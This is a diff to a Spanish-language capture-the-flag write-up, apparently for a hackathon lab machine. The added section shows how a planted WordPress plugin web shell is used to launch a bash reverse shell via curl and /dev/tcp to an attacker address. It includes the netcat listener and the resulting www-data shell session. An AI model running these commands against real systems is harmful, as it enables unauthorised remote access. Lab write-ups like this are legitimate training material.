@@ -84,6 +84,37 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 
+una vez tenemos nuestro _reverse shell_ metida en el WordPress, la lanzamos mediante el siguiente comando
+
+```shell
+curl -s "http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.0.2.15/4444%200>%261'"
+
+```
+> [!NOTE]
+> Se han formateado los 'espacios' a '%20' porque nos loas admite.
+
+en otra terminal estabamos escuchando con el comando 
+
+
+```shell
+nc -lvnp 4444
+```
+
+obteniendo el siguiente resultado y afirmándonos que estamos dentro de la máquina
+
+
+```shell
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 39800
+bash: cannot set terminal process group (764): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@reto02:/var/www/html/wp1$ whoami
+whoami
+www-data
+www-data@reto02:/var/www/html/wp1$ 
+
+```
+
 
 ### Flag 3
 
